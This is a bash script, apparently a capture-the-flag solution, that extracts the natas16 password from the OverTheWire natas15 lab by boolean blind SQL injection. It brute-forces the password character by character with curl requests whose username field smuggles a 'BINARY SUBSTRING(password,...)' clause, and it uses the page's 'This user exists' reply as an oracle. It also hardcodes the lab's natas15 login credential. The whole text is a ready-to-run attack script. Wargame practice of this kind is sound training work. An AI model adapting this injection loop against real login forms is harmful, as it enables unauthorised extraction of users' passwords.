#!/bin/bash

CHARS="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
PASS_LEN=32
URL="natas15.natas.labs.overthewire.org/index.php"
LOGIN="natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"
PASS=""

for pos in $(seq 1 $PASS_LEN); do
	for char in $(echo $CHARS | fold -w1); do
		OUT=$(curl $URL -u $LOGIN -s -F "username=natas16\" AND BINARY SUBSTRING(password,$pos,1)=\"$char\" -- \"" | grep "This user exists" | wc -l)
		if [ "$OUT" -eq 1 ]; then
			PASS+=$char
			echo "pass so far: $PASS"
			break
		fi
	done
done

echo "Password for natas16: $PASS"
	
